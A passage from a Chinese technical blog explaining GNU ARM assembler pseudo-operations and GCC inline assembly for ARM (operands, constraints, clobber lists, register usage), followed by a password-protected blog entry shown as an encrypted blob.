0x12345678,23876565</p><p>l        .quad:定义8字节，如:.quad 0x1234567890abcd</p><p>l        .float：定义浮点数，如：.float <strong>0f</strong>-314159265358979323846264338327\</p><p>​    95028841971.693993751E-40 @ <strong>- pi</strong></p><p>l        .string/.asciz/.ascii：定义多个字符串，如:</p><p>.string “abcd”,”efgh”, “hello!”</p><p>.asciz “qwer”,”sun”, “world!”</p><p>.ascii “welcome\0”</p><p>​     注意：ascii伪操作定义的字符串需要自行添加结尾字符’\0’。</p><p>l        .rept:重复定义伪操作, 格式如下：</p><p> .rept 重复次数</p><p>  数据定义</p><p> .endr @结束重复定义</p><p>  例：</p><p> .rept 3</p><p> .byte 0x23</p><p> .endr</p><p>l        .equ/.set: 赋值语句, 格式如下：</p><p>  .equ(.set)变量名，表达式</p><p>  例：</p><p> .equ abc, 3 @让abc=3</p><p><strong><2></2></strong>    函数的定义伪操作</p><p>l         函数的定义,格式如下：</p><p>  函数名<strong>:</strong></p><p>  函数体</p><p>  返回语句</p><p>​    一般的,<strong>函数如果需要在其他文件中调用, 需要用到.global伪操作将函数声明为全局函数。</strong>为了不至于在其他程序在调用某个C函数时发生混乱,对寄存器的使用我们需要遵循APCS准则。函数编译器将处理函数代码为一段.global的汇编码。</p><p>l         函数的编写应当遵循如下规则：</p><p><strong>a.</strong>         a1-a4寄存器（参数、结果或暂存寄存器，r0到r3 的同义字）以及浮点寄存器f0-f3(如果存在浮点协处理器)在函数中是不必保存的；</p><p><strong>b.</strong>         如果函数返回一个不大于一个字大小的值，则在函数结束时应该把这个值送到 r0 中；</p><p><strong>c.</strong>         如果函数返回一个浮点数，则在函数结束时把它放入浮点寄存器f0中；</p><p><strong>d.</strong>         如果函数的过程改动了sp（堆栈指针，r13）、fp（框架指针，r11）、sl（堆栈限制，r10）、lr（连接寄存器，r14）、v1-v8（变量寄存器，r4 到 r11）和 f4-f7,那么函数结束时这些寄存器应当被恢复为包含在进入函数时它所持有的值。</p><p><strong><3></3></strong>    .align .end .include .incbin伪操作</p><p>l        .align:用来指定数据的对齐方式,格式如下:</p><p>​         .align [absexpr1, absexpr2]</p><p>​      以某种对齐方式,<strong>在未使用的存储区域填充值</strong>. <strong>第一个值表示对齐方式,4, 8,16或 32.第二个表达式值表示填充的值。</strong></p><p>l        .end:表明源文件的结束。</p><p>l        .include:可以将指定的文件在使用.include 的地方展开,一般是头文件,例如:</p><p>​         .include “myarmasm.h”</p><p>l        .incbin伪操作可以将原封不动的一个二进制文件编译到当前文件中,使用方法如下:</p><p>​         .incbin”file”[,skip[,count]]</p><p>​         skip表明是从文件开始跳过skip个字节开始读取文件,count是读取的字数.</p><p><strong><4></4></strong>    ..if伪操作</p><p>​    根据一个表达式的值来决定是否要编译下面的代码, 用.endif伪操作来表示条件判断的结束,中间可以使用.else来决定.if的条件不满足的情况下应该编译哪一部分代码。</p><p>.if有多个变种:</p><p>.ifdefsymbol           @判断symbol是否定义</p><p>.ifcstring1,string2      @字符串string1和string2是否相等,字符串可以用单引号括起来</p><p>.ifeqexpression        @判断expression的值是否为0</p><p>.ifeqsstring1,string2    @判断string1和string2是否相等,字符串必须用双引号括起来</p><p>.ifgeexpression        @判断expression的值是否大于等于0</p><p>.ifgtabsolute expression @判断expression的值是否大于0</p><p>.ifleexpression        @判断expression的值是否小于等于0</p><p>.ifltabsolute expression    @判断expression的值是否小于0</p><p>.ifncstring1,string2        @判断string1和string2是否不相等, 其用法跟.ifc恰好相反。</p><p>.ifndefsymbol, .ifnotdef symbol @判断是否没有定义symbol, 跟.ifdef恰好相反</p><p>.ifneexpression          @如果expression的值不是0, 那么编译器将编译下面的代码</p><p>.ifnesstring1,string2      @如果字符串string1和string2不相等, 那么编译器将编译下面的代码.</p><p><strong><5></5></strong>    .global .type .title .list</p><p>l        .global/ .globl ：用来定义一个全局的符号，格式如下:</p><p>​          .global symbol 或者 .globl symbol</p><p>l         .type：用来指定一个符号的类型是函数类型或者是对象类型, 对象类型一般是数据, 格式如下:</p><p>​          .type 符号, 类型描述</p><p>例：</p><p>.globla</p><p>.data</p><p>.align4</p><p>.typea, @object</p><p>.sizea, 4</p><p>a:</p><p>.long10</p><p>例：</p><p>.section.text</p><p>.typeasmfunc, @function</p><p>.globlasmfunc</p><p>asmfunc:</p><p>mov pc,lr</p><p><strong><6></6></strong>    列表控制语句:</p><p>.title：用来指定汇编列表的标题,例如:</p><p>  .title “my program”</p><p>.list：用来输出列表文件.</p><p><strong><7></7></strong>    ARM特有的伪操作</p><p>l         .reg: 用来给寄存器赋予别名,格式如下:</p><p>​       别名 .req 寄存器名</p><p>l         .unreq: 用来取消一个寄存器的别名,格式如下:</p><p>.unreq 寄存器别名</p><p>​    注意被取消的别名必须事先定义过,否则编译器就会报错,这个伪操作也可以用来取消系统预制的别名, 例如r0, 但如果没有必要的话不推荐那样做。</p><p>l         .code伪操作用来选择ARM或者Thumb指令集,格式如下:</p><p>.code 表达式</p><p>　　如果表达式的值为16则表明下面的指令为Thumb指令,如果表达式的值为32则表明下面的指令为ARM指令.</p><p>l         .thumb伪操作等同于.code 16, 表明使用Thumb指令, 类似的.arm等同于.code 32</p><p>l         .force_thumb伪操作用来强制目标处理器选择thumb的指令集而不管处理器是否支持</p><p>l         .thumb_func伪操作用来指明一个函数是thumb指令集的函数</p><p>l         .thumb_set伪操作的作用类似于.set, 可以用来给一个标志起一个别名, 比.set功能增加的一点是可以把一个标志标记为thumb函数的入口, 这点功能等同于.thumb_func</p><p>l         .ltorg用于声明一个数据缓冲池(literal pool)的开始,它可以分配很大的空间。</p><p>l         .pool的作用等同.ltorg</p><p>l         .space&lt;number_of_bytes&gt; {,&lt;fill_byte&gt;}</p><p>​    分配number_of_bytes字节的数据空间，并填充其值为fill_byte，若未指定该值，缺省填充0。（与armasm中的SPACE功能相同）</p><p>l         .word <word1>{,<word2>} …<strong>插入一个32-bit的数据队列。</strong>（与armasm中的DCD功能相同）<strong>可以使用.word把标识符作为常量使用。</strong></word2></word1></p><p>例：</p><p>Start:</p><p>valueOfStart:</p><p>​     .word Start</p><p><strong>这样程序的开头Start便被存入了内存变量valueOfStart中。</strong></p><p>l         .hword<short1> {,<short2>} …</short2></short1></p><p>   插入一个16-bit的数据队列。（与armasm中的DCW相同）</p><h2 id="1-8-GNU-ARM汇编特殊字符和语法"><a href="#1-8-GNU-ARM汇编特殊字符和语法" class="headerlink" title="1.8.     GNU ARM汇编特殊字符和语法"></a>1.8.     GNU ARM汇编特殊字符和语法</h2><p><1>    代码行中的注释符号: ‘@’</1></p><p><2>    整行注释符号: ‘#’</2></p><p><3>    语句分离符号: ‘;’</3></p><p><4>    立即数前缀: ‘#’ 或 ‘$’</4></p><h1 id="3-ARM-GCC-内嵌汇编"><a href="#3-ARM-GCC-内嵌汇编" class="headerlink" title="3.       ARM GCC 内嵌汇编"></a>3.       ARM GCC 内嵌汇编</h1><p>对于基于ARM的RISC处理器，GNUC编译器提供了在C代码中内嵌汇编的功能。这种非常酷的特性提供了C代码没有的功能，比如手动优化软件关键部分的代码、使用相关的处理器指令。这里设想了读者是熟练编写ARM汇编程序读者，因为该片文档不是ARM汇编手册。同样也不是<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">C语言</a>手册。这篇文档假设使用的是GCC 4 的版本，但是对于早期的版本也有效。</p><p>GCCasm 声明</p><p>让我们以一个简单的例子开始。就像C中的声明一样，下面的声明代码可能出现在你的代码中。</p><p>/<em>NOP 例子 </em>/</p><p>asm(“movr0,r0”);</p><p>该语句的作用是将r0移动到r0中。换句话讲他并不干任何事。典型的就是NOP指令，作用就是短时的延时。</p><p>请接着阅读和学习这篇文档，因为该声明并不像你想象的和其他的C语句一样。内嵌汇编使用汇编指令就像在纯汇编程序中使用的方法一样。可以在一个asm声明中写多个汇编指令。但是为了增加程序的可读性，最好将每一个汇编指令单独放一行。</p><p>asm(</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0\n\t”</p><p>“mov r0, r0”</p><p>);</p><p>换行符和制表符的使用可以使得指令列表看起来变得美观。你第一次看起来可能有点怪异，但是当C编译器编译C语句的是候，它就是按照上面（换行和制表）生成汇编的。到目前为止，汇编指令和你写的纯汇编程序中的代码没什么区别。但是对比其它的C声明，asm的常量和寄存器的处理是不一样的。通用的内嵌汇编模版是这样的。</p><p>asm(code : output operand list : input operand list : clobberlist);</p><p><strong>汇编和C语句这间的联系是通过上面asm声明中可选的outputoperand list和input operand list</strong>。Clobber list后面再讲。</p><p>下面是将<a href="http://lib.csdn.net/base/c" target="_blank" rel="noopener">c语言</a>的一个整型变量传递给汇编，逻辑左移一位后在传递给C语言的另外一个整型变量。</p><p>/<em> Rotating bits example </em>/</p><p>asm(“mov %[result], %[value], ror #1” :[result] “=r” (y) : [value] “r” (x));</p><p>每一个asm语句被冒号（:）分成了四个部分。</p><p>汇编指令放在第一部分中的“”中间。</p><p>“mov %[result], %[value], ror #1”</p><p>接下来是冒号后的可选择的output operand list，<strong>每一个条目是由一对[]（方括号）和被他包括的符号名组成，它后面跟着限制性字符串，再后面是圆括号和它括着的C变量</strong>。这个例子中只有一个条目。</p><p>[result] “=r” (y)</p><p>接着冒号后面是输入操作符列表，它的语法和输入操作列表一样</p><p>[value] “r” (x)</p><p>破坏符列表，在本例中没有使用</p><p>就像上面的NOP例子，asm声明的4个部分中，<strong>只要最尾部没有使用的部分都可以省略。但是有有一点要注意的是，上面的4个部分中只要后面的还要使用，前面的部分没有使用也不能省略，必须空但是保留冒号</strong>。下面的一个例子就是设置ARMSoc的CPSR寄存器，它有input但是没有output operand。</p><p>asm(“msr cpsr,%[ps]” : : [ps]”r”(status))</p><p>即使汇编代码没有使用，代码部分也要保留空字符串。下面的例子<strong>使用了一个特别的破坏符，目的就是告诉编译器内存被修改过</strong>了。这里的破坏符在下面的优化部分在讲解。</p><p>asm(“”:::”memory”);</p><p><strong>为了增加代码的可读性，你可以使用换行，空格，还有C风格的注释</strong>。</p><p>asm(“mov %[result], %[value], ror#1”</p><p>​           : [result]”=r” (y) /<em>Rotation result. </em>/</p><p>​           : [value]”r” (x) /<em>Rotated value. </em>/</p><p>​           : /<em> No clobbers </em>/</p><p>);</p><p><strong>在代码部分%后面跟着的是后面两个部分方括号中的符号，它指的是相同符号操作列表中的一个条目</strong>。</p><p>%[result]表示第二部分的C变量y，%[value]表示三部分的C变量x；</p><p>符号操作符的名字使用了独立的命名空间。这就意味着它使用的是其他的符号表。简单一点就是说你不必关心使用的符号名在C代码中已经使用了。在早期的C代码中，循环移位的例子必须要这么写：</p><p>asm(“mov %0, %1, ror #1” :”=r” (result) : “r” (value))</p><p>在汇编代码中操作数的引用使用的是%后面跟一个数字，%1代表第一个操作数，%2代码第二个操作数，往后的类推。这个方法目前最新的编译器还是支持的。但是它不便于维护代码。试想一下，你写了大量的汇编指令的代码，要是你想插入一个操作数，那么你就不得不从新修改操作数编号。</p><p>优化C代码</p><p>有两种情况决定了你必须使用汇编。1st，C限制了你更加贴近底层操作硬件，比如，C中没有直接修改程序状态寄存器（PSR）的声明。2nd就是要写出更加优化的代码。毫无疑问GNUC代码优化器做的很好，但是他的结果和我们手工写的汇编代码相差很远。</p><p>这一部分有一点很重要，也是被别人忽视最多的就是：我们在C代码中通过内嵌汇编指令添加的汇编代码，也是要被C编译器的优化器处理的。让我们下面做个试验来看看吧。</p><p>下面是代码实例。</p><p>bigtree@just:~/embedded/basic-C$ arm-<a href="http://lib.csdn.net/base/linux" target="_blank" rel="noopener">linux</a>-gcc -c test.c</p><p>bigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o</p><p>编译器选择r3作为循环移位使用。它也完全可以选择为每一个C变量分配寄存器。Load或者store一个值并不显式的进行。下面是其它编译器的编译结果。</p><p>E420A0E1 mov r2, r4, ror #1 @ y, x</p><p>编译器为每一个操作数选择一个相应的寄存器，将操作过的值cache到r4中，然后传递该值到r2中。这个过程你能理解不？</p><p>有的时候这个过程变得更加糟糕。有时候编译器甚至完全抛弃你嵌入的汇编代码。C编译器的这种行为，取决于代码优化器的策略和嵌入汇编所处的上下文。如果在内嵌汇编语句中不使用任何输出部分，那么C代码优化器很有可能将该内嵌语句完全删除。比如NOP例子，我们可以使用它作为延时操作，但是对于编译器认为这影响了程序的执行速速，认为它是没有任何意义的。</p><p>上面的解决方法还是有的。那就是<strong>使用volatile关键字。它的作用就是禁止优化器优化</strong>。将NOP例子修改过后如下：</p><p>/<em> NOP example, revised </em>/</p><p><strong>asm volatile(“movr0, r0”);</strong></p><p>下面还有更多的烦恼等着我们。一个设计精细的优化器可能重新排列代码。看下面的代码：</p><p>i++;</p><p>if (j == 1)</p><p>x += 3;</p><p>i++;</p><p>优化器肯定是要从新组织代码的，两个i++并没有对if的条件产生影响。更进一步的来讲，i的值增加2，仅仅使用一条ARM汇编指令。因而代码要重新组织如下：</p><p>if (j == 1)</p><p>   x += 3;</p><p>i += 2;</p><p>这样节省了一条ARM指令。结果是：这些操作并没有得到许可。</p><p>这些将对你的代码产生很到的影响，这将在下面介绍。下面的代码是c乘b，其中c和b中的一个或者两个可能会被中断处理程序修改。进入该代码前先禁止中断，执行完该代码后再开启中断。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” ::: “r12”, “cc”);</p><p>c <em>= b; /</em> This may fail. */</p><p>asm volatile(“mrs r12, cpsr\n”</p><p>   “bic r12, r12, #0xC0\n”</p><p>   “msr cpsr_c, r12” ::: “r12”, “cc”);</p><p>但是不幸的是针对上面的代码，优化器决定先执行乘法然后执行两个内嵌汇编，或相反。这样将会使得我们的代码变得毫无意义。</p><p>我们可以使用clobberlist帮忙。上面例子中的clobber list如下：</p><p><strong>“r12”,”cc”</strong></p><p><strong>上面的clobber list将会将向编译器传达如下信息，修改了r12和程序状态寄存器的标志位。Btw，直接指明使用的寄存器，将有可能阻止了最好的优化结果。通常你只要传递一个变量，然后让编译器自己选择适合的寄存器。另外寄存器名，cc（condition registor 状态寄存器标志位），memory都是在clobber list上有效的关键字</strong>。<strong>它用来向编译器指明，内嵌汇编指令改变了内存中的值</strong>。这将强迫编译器在执行汇编代码前存储所有缓存的值，然后在执行完汇编代码后重新加载该值。这将保留程序的执行顺序，因为在使用了带有memory clobber的asm声明后，所有变量的内容都是不可预测的。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” :: : “r12”, “cc”,”memory”);</p><p>c <em>= b; /</em> This is safe. */</p><p>asm volatile(“mrs r12, cpsr\n”</p><p>   “bic r12, r12, #0xC0\n”</p><p>   “msr cpsr_c, r12” ::: “r12”, “cc”,”memory”);</p><p>使所有的缓存的值都无效，只是局部最优（suboptimal）。你可以有选择性的添加dummyoperand 来人工添加依赖。</p><p>asm volatile(“mrs r12,cpsr\n\t”</p><p>   “orr r12, r12, #0xC0\n\t”</p><p>   “msr cpsr_c, r12\n\t” : “=X” (b) :: “r12”,”cc”);</p><p>c <em>= b; /</em> This is safe. */</p><p>asm volatile(“mrs r12</p><p>上面的第一个asm试图修改变量先b，第二个asm试图修改c。这将保留三个语句的执行顺序，而不要使缓存的变量无效。</p><p>理解优化器对内嵌汇编的影响很重要。如果你读到这里还是云里雾里，最好是在看下个主题之前再把这段文章读几遍^_^。</p><p>Input and output operands</p><p>前面我们学到，每一个input和output operand，由被方括号[]中的符号名，限制字符串，圆括号中的C表达式构成。</p><p>这些限制性字符串有哪些，为什么我们需要他们？你应该知道每一条汇编指令只接受特定类型的操作数。例如：跳转指令期望的跳转目标地址。不是所有的内存地址都是有效的。因为最后的opcode只接受24位偏移。但矛盾的是跳转指令和数据交换指令都希望寄存器中存储的是32位的目标地址。在所有的例子中，C传给operand的可能是函数指针。所以面对传给内嵌汇编的常量、指针、变量，编译器必须要知道怎样组织到汇编代码中。</p><p>对于ARM核的处理器，GCC 4 提供了一下的限制。</p><table><thead><tr><th>Constraint</th><th>Usage in ARM state</th><th>Usage in Thumb state</th></tr></thead><tbody><tr><td>f</td><td>Floating point registers f0 .. f7</td><td>Not available</td></tr><tr><td>G</td><td>Immediate floating point constant</td><td>Not available</td></tr><tr><td>H</td><td>Same a G, but negated</td><td>Not available</td></tr><tr><td>I</td><td>Immediate value in data processing instructionse.g. ORR R0, R0, #operand</td><td>Constant in the range 0 .. 255e.g. SWI operand</td></tr><tr><td>J</td><td>Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand]</td><td>Constant in the range -255 .. -1e.g. SUB R0, R0, #operand</td></tr><tr><td>K</td><td>Same as I, but inverted</td><td>Same as I, but shifted</td></tr><tr><td>L</td><td>Same as I, but negated</td><td>Constant in the range -7 .. 7e.g. SUB R0, R1, #operand</td></tr><tr><td>l</td><td>Same as r</td><td>Registers r0..r7e.g. PUSH operand</td></tr><tr><td>M</td><td>Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand</td><td>Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand</td></tr><tr><td>m</td><td>Any valid memory address</td><td></td></tr><tr><td>N</td><td>Not available</td><td>Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand</td></tr><tr><td>o</td><td>Not available</td><td>Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand</td></tr><tr><td>r</td><td>General register r0 .. r15e.g. SUB operand1, operand2, operand3</td><td>Not available</td></tr><tr><td>W</td><td>Vector floating point registers s0 .. s31</td><td>Not available</td></tr><tr><td>X</td><td>Any operand</td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td>= ：Write-only operand, usually used for all output operands+ ：Read-write operand, must be listed as an output operand&amp; ：A register that should be used for output only</td><td></td></tr></tbody></table><p>Output operands必须为write-only，相应C表达式的值必须是左值。Input operands必须为read-only。C编译器是没有能力做这个检查。</p><p>比较严格的规则是：不要试图向input operand写。但是如果你想要使用相同的operand作为input和output。限制性modifier（+）可以达到效果。例子如下：</p><p>asm(“mov %[value], %[value], ror #1” : [value]”+r” (y))</p><p>和上面例子不一样的是，最后的结果存储在input variable中。</p><p>可能modifier + 不支持早期的编译器版本。庆幸的是这里提供了其他解决办法，该方法在最新的编译器中依然有效。<strong>对于input operators有可能使用单一的数字n在限制字符串中。使用数字n可以告诉编译器使用的第n个operand，operand都是以0开始计数</strong>。下面是例子：</p><p>asm(“mov %0, %0, ror #1” : “=r” (value) :”0” (value))</p><p><strong>限制性字符串“0”告诉编译器，使用和第一个output operand使用同样input register。</strong></p><p>请注意，在相反的情况下不会自动实现。如果我没告诉编译器那样做，编译器也有可能为input和output选择相同的寄存器。第一个例子中就为input和output选择了r3。</p><p>在多数情况下这没有什么，但是如果在input使用前output已经被修改过了，这将是致命的。在input和output使用不同寄存器的情况下，你必须使用&amp;modifier来限制outputoperand。下面是代码示例：</p><p>asm volatile(“ldr %0, [%1]””\n\t”</p><p>​             “str %2, [%1, #4]””\n\t”</p><p>​             : “=&amp;r” (rdv)</p><p>​            : “r”(&amp;table), “r” (wdv)</p><p>​             : “memory”);</p><p>在以张表中读取一个值然后在写到该表的另一个位置。</p><p>其他</p><p><strong>内嵌汇编作为预处理宏</strong></p><p>要是经常使用使用部分汇编，最好的方法是将它以宏的形式定义在头文件中。使用该头文件在严格的ANSI模式下会出现警告。为了避免该类问题<strong>，可以使用<strong>asm</strong>代替asm，<strong>volatile</strong>代替volatile</strong>。这可以等同于别名。下面就是个例程：</p><p>#define BYTESWAP(val) \</p><p>   <strong>asm</strong> <strong>volatile</strong> ( \</p><p>​       “eor r3, %1, %1, ror #16\n\t” \</p><p>​       “bic r3, r3, #0x00FF0000\n\t” \</p><p>​       “mov %0, %1, ror #8\n\t” \</p><p>​       “eor %0, %0, r3, lsr #8” \</p><p>​       : “=r” (val) \</p><p>​       : “0”(val) \</p><p>​       : “r3”, “cc” \</p><p>);</p><p><strong>C 桩函数</strong></p><p>宏定义包含的是相同的代码。这在大型routine中是不可以接受的。这种情况下最好定义个桩函数。</p><p>unsigned long ByteSwap(unsigned longval)</p><p>{</p><p>asm volatile (</p><p>​       “eor r3, %1, %1, ror #16\n\t”</p><p>​       “bic r3, r3, #0x00FF0000\n\t”</p><p>​       “mov %0, %1, ror #8\n\t”</p><p>​       “eor %0, %0, r3, lsr #8”</p><p>​       : “=r” (val)</p><p>​       : “0”(val)</p><p>​       : “r3”</p><p>);</p><p>return val;</p><p>}</p><p><strong>替换C变量的符号名</strong></p><p>默认的情况下，GCC使用同函数或者变量相同的符号名。你可以使用asm声明，为汇编代码指定一个不同的符号名</p><p>unsigned long value asm(“clock”) = 3686400</p><p>这个声明告诉编译器使用了符号名clock代替了具体的值。</p><p><strong>替换C函数的符号名</strong></p><p>为了改变函数名，你需要一个原型声明，因为编译器不接受在函数定义中出现asm关键字。</p><p>extern long Calc(void) asm (“CALCULATE”)</p><p>调用函数calc()将会创建调用函数CALCULATE的汇编指令。</p><p><strong>强制使用特定的寄存器</strong></p><p>局部变量可能存储在一个寄存器中。你可以利用内嵌汇编为该变量指定一个特定的寄存器。</p><p>void Count(void) {</p><p>register unsigned char counterasm(“r3”);</p><p>… some code…</p><p>asm volatile(“eor r3, r3,r3”);</p><p>… more code…</p><p>}</p><p>汇编指令“eor r3, r3, r3”，会将r3清零。Waring：该例子在到多数情况下是有问题的，因为这将和优化器相冲突。因为GCC不会预留其它寄存器。要是优化器认为该变量在以后一段时间没有使用，那么该寄存器将会被再次使用。但是编译器并没有能力去检查是否和编译器预先定义的寄存器有冲突。如果你用这种方式指定了太多的寄存器，编译器将会在代码生成的时候耗尽寄存器的。</p><p><strong>临时使用寄存器</strong></p><p>如果你使用了寄存器，而你没有在input或output operand传递，那么你就必须向编译器指明这些。下面的例子中使用r3作为scratch 寄存器，通过在clobber list中写r3，来让编译器得知使用该寄存器。由于ands指令跟新了状态寄存器的标志位，使用cc在clobber list中指明。</p><p>asm volatile(</p><p>   “ands r3, %1, #3” “\n\t”</p><p>   “eor %0, %0, r3” “\n\t”</p><p>   “addne %0, #4”</p><p>   : “=r” (len)</p><p>   : “0” (len)</p><p>   : “cc”, “r3”</p><p> );</p><p>最好的方法是使用桩函数并且使用局部临时变量</p><p>寄存器的用途</p><p>比较好的方法是分析编译后的汇编列表，并且学习C 编译器生成的代码。下面的列表是编译器将ARM核寄存器的典型用途，知道这些将有助于理解代码。</p><table><thead><tr><th>Register</th><th>Alt. Name</th><th>Usage</th></tr></thead><tbody><tr><td>r0</td><td>a1</td><td>First function argumentInteger function resultScratch register</td></tr><tr><td>r1</td><td>a2</td><td>Second function argumentScratch register</td></tr><tr><td>r2</td><td>a3</td><td>Third function argumentScratch register</td></tr><tr><td>r3</td><td>a4</td><td>Fourth function argumentScratch register</td></tr><tr><td>r4</td><td>v1</td><td>Register variable</td></tr><tr><td>r5</td><td>v2</td><td>Register variable</td></tr><tr><td>r6</td><td>v3</td><td>Register variable</td></tr><tr><td>r7</td><td>v4</td><td>Register variable</td></tr><tr><td>r8</td><td>v5</td><td>Register variable=</td></tr><tr><td>r9</td><td>v6</td><td>rfpRegister variableReal frame pointer</td></tr><tr><td>r10</td><td>sl</td><td>Stack limit</td></tr><tr><td>r11</td><td>fp</td><td>Argument pointer</td></tr><tr><td>r12</td><td>ip</td><td>Temporary workspace</td></tr><tr><td>r13</td><td>sp</td><td>Stack pointer</td></tr><tr><td>r14</td><td>lr</td><td>Link register Workspace</td></tr><tr><td>r15</td><td>pc</td><td>Program counter</td></tr></tbody></table></instruction>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LOVE</title>
      <link href="/2019/05/27/LOVE/"/>
      <url>/2019/05/27/LOVE/</url>
      
        <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read.">    <label for="pass">Please enter the password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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